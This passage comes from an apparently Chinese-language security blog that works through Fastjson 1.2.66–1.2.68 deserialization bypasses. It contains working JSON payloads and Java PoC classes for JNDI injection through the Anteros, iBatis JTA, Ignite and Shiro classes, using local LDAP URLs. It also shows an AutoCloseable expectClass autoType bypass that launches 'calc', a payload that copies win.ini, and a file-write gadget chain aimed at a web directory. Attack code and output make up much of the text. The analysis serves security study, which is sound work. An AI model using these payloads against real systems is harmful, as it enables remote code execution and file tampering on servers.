alt="image-20240901022129364"></p><p>最终走到这执行了get方法</p><p>所以总结执行get方法的条件(不过主要是针对用了parse方法而没用parseObject，因为parseObject本身就会连get一起执行)：</p><p>parse他会去优先去匹配调用字段的set方法，如果没有set方法，就会去寻找字段的get方法且返回值要是Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</p><blockquote><p>所以前面可能写的有点乱，因为写到这才真正调会get和set的调用😢</p></blockquote><p><strong>br.com.anteros.dbcp.AnterosDBCPConfig</strong></p><p>导入依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-Core --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-Core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>br.com.anteros<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Anteros-DBCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Anteros_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload1=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>payload1分析</strong></p><p>调用AnterosDBCPConfig#setMetricRegistry</p><p><img src="https://cdn.clown2024.cn/202409011042417.png" alt="image-20240901104216255"></p><p>然后调用AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011043947.png" alt="image-20240901104316840"></p><p>这里存在jndi注入漏洞</p><p><strong>payload2分析</strong></p><p>调用AnterosDBCPConfig#setHealthCheckRegistry</p><p><img src="https://cdn.clown2024.cn/202409011044736.png" alt="image-20240901104447626"></p><p>调用AnterosDBCPConfig#getObjectOrPerformJndiLookup</p><p><img src="https://cdn.clown2024.cn/202409011045210.png" alt="image-20240901104535103"></p><p>这里存在jndi注入漏洞</p><blockquote><p>这个Anteros看maven仓库用的人好少，感觉比较难碰到</p></blockquote><p><strong>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</strong></p><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-sqlmap --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ibatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ibatis-sqlmap<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.726<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JTA_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:9999/xCxXLJwZ\&quot;&#125;&#125;&quot;</span>;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409011109175.png" alt="image-20240901110919034"></p><p>利用链分析</p><p>首先调用到JtaTransactionConfig#setProperties方法</p><p><img src="https://cdn.clown2024.cn/202409011111348.png" alt="image-20240901111125227"></p><p>这里存在jndi漏洞，但是utxName获取为固定的键值，为Properties对象的UserTransaction</p><p>所以payload里的properties值的设置为Properties类然后加一个UserTransaction属性</p><h2 id="fastjson1267"><a href="#Fastjson1-2-67" class="headerlink" title="Fastjson1.2.67"></a>Fastjson1.2.67</h2><p>也是黑名单绕过，直接给payload，不想分析了（</p><p>这里的条件也是开启autoType</p><p><strong>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</strong></p><p>需要ignite-core、ignite-jta和jta依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-jta --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-core --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031930659.png" alt="image-20240903193000515"></p><p>利用链分析：</p><p>根据poc来看看漏洞点</p><p><img src="https://cdn.clown2024.cn/202409031938377.png" alt="image-20240903193814261"></p><p><img src="https://cdn.clown2024.cn/202409031938851.png" alt="image-20240903193827745"></p><p>所以就是从jndiNames遍历，然后在getTm方法中触发jndi漏洞，这里的tm属性只有get方法</p><p>但是根据他的返回值看起来并不满足我们前面说的触发get方法的特征，这里就涉及到Fastjson的循环引用</p><p><strong>循环引用</strong></p><p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p><p>fastjson支持循环引用，并且是缺省打开的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//引用可以自己关闭，关闭后可能导致json数据传输的时候丢失<br>//全局配置关闭<br>JSON.DEFAULT_GENERATE_FEATURE |= SerializerFeature.DisableCircularReferenceDetect.getMask();<br>//非全局关闭<br>JSON.toJSONString(obj, SerializerFeature.DisableCircularReferenceDetect);<br></code></pre></td></tr></table></figure><table><thead><tr><th>语法</th><th>描述</th></tr></thead><tbody><tr><td>{“$ref”:”$”}</td><td>引用根对象</td></tr><tr><td>{“$ref”:”@”}</td><td>引用自己</td></tr><tr><td>{“$ref”:”..”}</td><td>引用父对象</td></tr><tr><td>{“$ref”:”..&#x2F;..”}</td><td>引用父对象的父对象</td></tr><tr><td>{“$ref”:”$.members[0].reportTo”}</td><td>基于路径的引用</td></tr></tbody></table><p><code>$ref</code>即循环引用：当一个对象包含另一个对象时，Fastjson就会把该对象解析成引用。引用是通过<code>$ref</code>标示的。</p><p>所以这里poc后面的{“$ref”:”$.tm”}就是基于路径引用，相当于调用了根对象的tm属性，自然就要调用get方法，这里的根对象就是CacheJndiTmLookup</p><p><strong>org.apache.shiro.jndi.JndiObjectFactory</strong></p><p>需要shiro-core和slf4j-api依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031934084.png" alt="image-20240903193341386"></p><p><strong>利用链分析</strong></p><p><img src="https://cdn.clown2024.cn/202409032004058.png" alt="image-20240903200449945"></p><p><img src="https://cdn.clown2024.cn/202409032004849.png" alt="image-20240903200455729"></p><p>这里就同理，该类也是只有getInstance方法，然后利用循环引用然后调用到get方法触发jndi漏洞</p><h2 id="fastjson1268"><a href="#Fastjson1-2-68" class="headerlink" title="Fastjson1.2.68"></a>Fastjson1.2.68</h2><p>这次是利用expectClass来绕过checkAutoType函数，大体思路如下：</p><ol><li>先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数；</li><li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用；</li></ol><p>利用条件：</p><ul><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li></ul><p>这里先展示攻击流程</p><p>假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">VulAutoCloseable</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>poc如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;vul.VulAutoCloseable&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-comment">//fastjson1.2.68</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoType_RaoGuo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.clown.vul.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031446394.png" alt="image-20240903144639232"></p><p>可以看到没有开启autoTypeSupport也能够成功</p><p>直接从checkAutoType函数开始调试</p><p><img src="https://cdn.clown2024.cn/202409031453120.png" alt="image-20240903145345998"></p><p>到这里可以直接可以从缓存中获取到AutoCloseable这个类</p><p><img src="https://cdn.clown2024.cn/202409031502045.png" alt="image-20240903150200931"></p><p>然后往下直接return了，因为这时候expectClass还是空的</p><p><img src="https://cdn.clown2024.cn/202409031532444.png" alt="image-20240903153245307"></p><p>然后传进去AutoCloseable反序列化，继续跟进</p><p><img src="https://cdn.clown2024.cn/202409031542039.png" alt="image-20240903154215912"></p><p>到这里获取反序列化器为空，然后typeName为我们的实现类，expectClass传递的是AutoCloseable类，继续跟进checkAutoType函数</p><p><img src="https://cdn.clown2024.cn/202409031554161.png" alt="image-20240903155427045"></p><p>到这里expectClassFlag就为true了</p><p><img src="https://cdn.clown2024.cn/202409031557163.png" alt="image-20240903155741275"></p><p>最后走到这个地方，expectClassFlag使判断为true，最终进行loadClass</p><p><img src="https://cdn.clown2024.cn/202409031604442.png" alt="image-20240903160414341"></p><p>然后往下有对加载的类进行判断，这些都是常见的jndi利用链的类，如果属于这些类或者子类直接抛出异常</p><p><img src="https://cdn.clown2024.cn/202409031602941.png" alt="image-20240903160225818"></p><p>往下还有一个加入缓存，然后return，这里还判断了我们的clazz是否为expectClass的子类，所以恶意类必须要继承expectClass</p><p>然后就是反序列化触发构造函数弹计算器</p><blockquote><p>不过这里不过get或者set直接构造函数也可以了，在早期版本我试了一下只能默认构造方法，不过如果存在默认构造方法也是优先默认构造方法</p></blockquote><h3 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h3><p>实战中要去找实际可行的利用类，也就是继承了autoCloaseable类的，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。</p><p>寻找gadget的条件可以参考这样：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">需要一个通过 set 方法或构造方法指定文件路径的 OutputStream<br>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream<br>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法<br>以上三个组合在一起就能构造成一个写文件的利用链，我通过扫描了一下 JDK ，找到了符合第一个和第三个条件的类。<br></code></pre></td></tr></table></figure><p>下面是一些利用payload</p><p><strong>复制文件</strong></p><p>利用类：<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p><p>利用依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>去看一下SafeFileOutputStream的源码：</p><p><img src="https://cdn.clown2024.cn/202409031659197.png" alt="image-20240903165946075"></p><p>该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中</p><p>利用PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;C:/Windows/win.ini&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;D:/win.txt&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Move</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;D:/win.txt\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031704660.png" alt="image-20240903170451492"></p><p><strong>文件写入</strong></p><p>写内容类：<strong>com.esotericsoftware.kryo.io.Output</strong></p><p>依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Output类主要用来写内容，它提供了setBuffer()和setOutputStream()两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其flush()函数</p><p>看一下Output类的源码</p><p><img src="https://cdn.clown2024.cn/202409031911793.png" alt="image-20240903191151647"></p><p><img src="https://cdn.clown2024.cn/202409031915040.png" alt="image-20240903191539933"></p><p><img src="https://cdn.clown2024.cn/202409031913515.png" alt="image-20240903191344410"></p><p>所以我们要想办法调用到Output的flush函数</p><p>flush函数可以在调用close函数和require函数时触发</p><p><img src="https://cdn.clown2024.cn/202409032015641.png" alt="image-20240903201552519"></p><p><img src="https://cdn.clown2024.cn/202409032015969.png" alt="image-20240903201535860"></p><p>然后require函数在write相关函数触发</p><p><img src="https://cdn.clown2024.cn/202409032016029.png" alt="image-20240903201620928"></p><p><img src="https://cdn.clown2024.cn/202409032017695.png" alt="image-20240903201703586"></p><p>然后找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其setBlockDataMode()函数中调用了drain()函数、drain()函数中又调用了out.write()函数，满足前面的需求</p><blockquote><p>这都咋找的啊😢</p></blockquote><p><img src="https://cdn.clown2024.cn/202409032020430.png" alt="image-20240903202010304"></p><p><img src="https://cdn.clown2024.cn/202409032020708.png" alt="image-20240903202044589"></p><p>然后对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在</p><p><img src="https://cdn.clown2024.cn/202409032023421.png" alt="image-20240903202324306"></p><p>但是Fastjson优先获取的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发，然后找到只有有参构造函数的ObjectOutputStream继承类：<strong>com.sleepycat.bind.serial.SerialOutput</strong>，这个类在这个依赖里面</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sleepycat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>je<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.73<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032027918.png" alt="image-20240903202720784"></p><p>然后这里调用了父类的构造方法，到这里最终满足条件</p><p>poc如下，然后也运用了前面的循环引用技巧</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span 